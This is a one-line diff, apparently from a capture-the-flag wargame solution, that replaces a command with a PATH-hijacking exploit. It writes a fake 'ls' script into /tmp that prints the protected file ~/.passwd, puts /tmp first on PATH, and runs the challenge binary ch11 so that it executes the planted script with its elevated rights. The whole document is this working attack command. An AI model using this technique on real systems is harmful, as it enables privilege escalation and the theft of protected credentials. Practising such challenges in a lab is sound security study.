@@ -1,1 +1,1 @@
-export PATH=/tmp && ./ch11
+echo "/bin/cat ~/.passwd" > /tmp/ls && export PATH=/tmp && ./ch11
